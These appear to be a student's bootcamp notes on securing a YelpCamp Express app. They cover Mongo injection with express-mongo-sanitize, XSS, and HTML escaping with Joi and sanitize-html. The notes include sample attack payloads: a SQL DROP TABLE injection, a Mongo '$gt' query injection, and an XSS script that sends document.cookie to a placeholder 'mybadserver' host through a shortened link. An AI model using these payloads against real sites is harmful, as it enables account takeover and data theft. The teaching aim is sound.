# Section 58 - YelpCamp: Common Security Issues

This section will focus on security issues and how to address them (or at least attempt to address them). Security is a topic that could be a 40-50 hour course, and it's a really complicated topic; we won't be able to hit all of the points, but rather basic issues

## 1. Mongo Injection

### 1.1 Intro to SQL Injection

The first thing we will talk about is SQL injection. It refers to a common SQL exploit where a SQL query that uses some part of user's input to form the query. For example, when a user is doing a search with a search field, the user can type something in there and use that search field to populate that query. The way SQL injection works is that it takes advantage of SQL syntax. Below is an example:

```sql
statement = " SELECT * FROM users WHERE name = ' " + userName + " '; "
```

You are putting a username in that query and that's what is being searched in the DB. A basic SQL attack is when a user doesn't enter an actual username, but rather their own query. Below is an example:

```sql
SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';
```

Mongo is also prone to injections, not just SQL databases. One example of an injection is this code below:

```
db.users.find({username: req.body.username})
db.users.find({username: 'tim'})

> db.users.find({username: 'tim'})
{ "_id" : ObjectId("6014644ae18c19056071bdb6"), "email" : "tim@gmail.com", "username" : "tim", "salt" : "2b618460a1e26e794555d10d71aa9371ca323f6af3fb972bdd6501b9a8ee5539", "hash" : "6d7975090b7e18aa87be4bc13c045292d1d111eadcf38a017ca7fed7b6a48db87aa7998500938f4c53a2234b607c5acab09649046ce0518b14bef4334523fd83eec82bbd0cc0d4cef4aa578c7fa95b9321efbb7923cac616e8d12145998ccd3c1828a0cca2124960372b8bf75d348254bbe0f89cb7b4fd4bdadf7074f84308093fbab8456738b805bbf6e6a79733707dad5862d2e09ac5daddbcbbcac83afcc0d9890687252e2934e15907a99ae01ff90402b509c19031f3de3472b19ad1177107cb9bda19493504b48d4238440283fb7feea679017e900dd9d7c84af883a91ada4f00ec537ce1d00f5f948be2cf40b52823870c272d7a6d0e4318c0f376c185f12d88b3a4ac9f04614da71e1579e3b1fe721db64a027a2086926e114a314b262b1ac4a55ecce9a2d50f6a9892339fe0e5d01da8c46f54cef47ffa590ea54e444b5c69b31228dec922d02ce14301733619cbe93d2358b23ba23a29a2f1ef45997ddb9a2383ae57c45f87bf6b9aa0cbf7de9d00a626d1bc57d4ec2810235a9137dab6c06bbc6dcb5201f05aa91a1c140e316003968ede4159b57d8d7a3dc869f8e6adb1bcc1d52f6a0763cb2243052a43c6c9d0bfc4beb1cdbd206b84fa1122ebe2cfa84dab160db41941859f184928b396a9584d3ccc1394050e6b1443cc8976c2a6192bec994cfed6032f3ea0e6fe1688ba735290d0f98f48d63da2ef3ce35a", "__v" : 0 }
```

Right now the user is finding `tim` with their query. If a user enters something more devious, then bad things can happen. One example is this below:

```
{"$gt": ""}
```

Remember that `gt` means "greater than". If we replaced `tim` with that, it's saying "find all users with a username that's greater than nothing." All usernames in our DB are greater than an empty string, which is always true

```
> db.users.find({username: {"$gt": ""}})
```

### 1.2 Express Mongo Sanitize

This will then return all users to the attacker. All we need to do to address this basic level of attack is not allow users to have dollar signs and periods in their search queries. There's a package that helps us do that called _Express Mongo Sanitize_. This module searches for any keys in objects that begin with a $ sign or contain a ., from `req.body`, `req.query` or `req.params`. It can then either:

- completely remove these keys and associated data from the object, or
- replace the prohibited characters with another allowed character.

Let's install that package with `npm i express-mongo-sanitize`. Then, inside of our `app.js`, let's print out our search query

```js
// app.js
app.use((req, res, next) => {
    console.log(req.query);
    res.locals.currentUser = req.user;
    res.locals.success = req.flash('success');
    res.locals.error = req.flash('error');
    next();
});
```

Right now, no sanitization is taking place. If we make our own request with a dollar sign, this will show up in our console:

![img1](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img1.jpg?raw=true)

```
{ '$gt': 'rgkmergmgre' }
```

All we need to do to fix this is include Express Mongo Sanitize

```js
// app.js
const mongoSanitize = require('express-mongo-sanitize');
...
app.use(mongoSanitize());
```

So now when we send the exact same request, our `req.query` is empty. We can also replace the $ symbol with another one

```js
app.use(mongoSanitize({
    replaceWith: '_'
}));
```

![img2](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img2.jpg?raw=true)

![img3](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img3.jpg?raw=true)

## 2. Cross-Site Scripting (XSS)

The next type of vulnerability we will briefly talk about is **Cross-Site Scripting (XSS)**. This is a common and potentially very powerful vulnerability. The idea is to inject some client-side script into someone else's web app. The script usually does something bad, like stealing cookies, making users do things they don't want to, or accessing user information. Cross-site scripting makes up roughly 84% of all security vulnerabilities. We will not go into a whole lot detail on it.

There's is this one game called _XSS Game_ that introduces the idea of XSS.

- https://xss-game.appspot.com/

On the first level, the website wants us to enter a query in the search bar

![img4](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img4.jpg?raw=true)

![img5](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img5.jpg?raw=true)

The website displays the query directly in the document, and that's important because we can add our own tags

![img6](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img6.jpg?raw=true)

![img7](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img7.jpg?raw=true)

The website is directly taking our query and embedding it into the HTML document

![img8](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img8.jpg?raw=true)

![img9](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img9.jpg?raw=true)

One thing that you can access through JS are cookies. A lot of people with have their cookies under `document.cookies`. If you can inject a script like the one below, you can take that information from a single user and send it to somewhere else. On the script below, it's saying that we are making a new image element. Whenever we set the `src` of an image, your browser is sending a request.

```html
<script>
new Image().src='mybadserver/hacker?output='+document.cookie;
</script>
```

So if we have that script in a URL, we can shorten it so that no one sees it. When we send this link out to people and the click on it, we can retrieve their information

```
yourwebsite.com?name<script>new Image().src='mybadserver/hacker?output='+document.cookie;</script>
```

## 3. Sanitizing HTML w/ JOI

### 3.1 How EJS Prevents Embedded HTML

Let's go back to a camp and see what happens if we try to inject a script or even an HTML element to start. When we edit our campground's name to have an `<h1>` tag, we will see this:

![img10](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img10.jpg?raw=true)

![img11](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img11.jpg?raw=true)

This is not treated as HTML, and the reason for this is that in EJS, when we use the `<%= %>` syntax, this will escape HTML.

```
<h5 class="card-title"><%= campground.title %></h5>
```

When we view the page source, we see that entity codes are used

```html
<h5 class="card-title">Dusty Sands &lt;h1&gt;HI&lt;/h1&gt;</h5>
```

But there is a problem: we are still vulnerable to this issue. There is one place where our elements are treated as HTML, and that is in our campground's marker on the map

![img12](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img12.jpg?raw=true)

### 3.2 Using JOI to Have Safeguards

#### 3.2.1 Intro

Let's look at our `showPageMap.js` to see what we've done

```js
// showPageMap.js
new mapboxgl.Marker()
  .setLngLat(campground.geometry.coordinates)
  .setPopup(
    new mapboxgl.Popup({offset: 25})
      .setHTML(
        `<h3>${campground.title}</h3>
        <p>${campground.location}</p>`
      )
  )
  .addTo(map);
```

As you can see, we are using `.setHTML()` to embed our HTML. Remember that we have to pass our information from EJS and Node to actual JS so that we have access to `campground`. This is happening in our `show.ejs`

```html
<!-- show.ejs -->
<script>
  const mapToken = '<%-process.env.MAPBOX_TOKEN%>';
  const campground = <%- JSON.stringify(campground) %>;
</script>
```

One thing we can do to fix this is changing `<%-` to `<%=` to escape the HTML. Unfortunately that will break things. What we can do instead is make our own validations to sanitize our HTML so that users cannot include tags in their queries. 

JOI allows us to create extensions which allows us to define our own methods. One function that we will make is `escapeHTML()`

```js
module.exports.reviewSchema = Joi.object({
    review: Joi.object({
        rating: Joi.number().required()
            .min(1)
            .max(5),
        body: Joi.string().required().escapeHTML()
    }).required()
});
```

This is the custom function that we will use: 

```js
// schemas.js
const extension = (joi) => ({
    type: 'string',
    base: joi.string(),
    messages: {
        'string.escapeHTML': '{{#label}} must not include HTML!'
    },
    rules: {
        escapeHTML: {
            validate(value, helpers) {
                const clean = sanitizeHtml(value, {
                    allowedTags: [],
                    allowedAttributes: {},
                });
                if (clean !== value) return helpers.error('string.escapeHTML', { value })
                return clean;
            }
        }
    }
});
```

#### 3.2.2 sanitize-html

This function will be applicable on our string properties. We will also use a package called `sanitize-html`

- https://www.npmjs.com/package/sanitize-html

`sanitize-html` removes HTML tags from strings. Here's an example on how it works:

```js
> const sanitizeHTML = require('sanitize-html')
> sanitizeHTML("<script>alert('HI')</script>")
''
```

Inside of our `escapeHTML()` function, we are ruling out everything from our `allowedTags` and `allowedAttribute` keys

```js
// schemas.js
validate(value, helpers) {
    const clean = sanitizeHtml(value, {
        allowedTags: [],
        allowedAttributes: {},
    });
```

To use `escapeHTML()`, we will have to use this code below so that we can apply it to all Joi objects

```js
// schemas.js
const BaseJoi = require('joi');
const Joi = BaseJoi.extend(extension);
```

```js
// schemas.js
module.exports.campgroundSchema = Joi.object({
    campground: Joi.object({
        title: Joi.string().required().escapeHTML(),
        price: Joi.number().required().min(0),
        // image: Joi.string().required(),
        location: Joi.string().required().escapeHTML(),
        description: Joi.string().required().escapeHTML()
    }).required(),
    deletedImages: Joi.array()
});
```

So now let's see what happens when we use HTML tags on our reviews or campgrounds

![img13](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img13.jpg?raw=true)

![img14](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img14.jpg?raw=true)

![img15](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img15.jpg?raw=true)

![img16](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img16.jpg?raw=true)
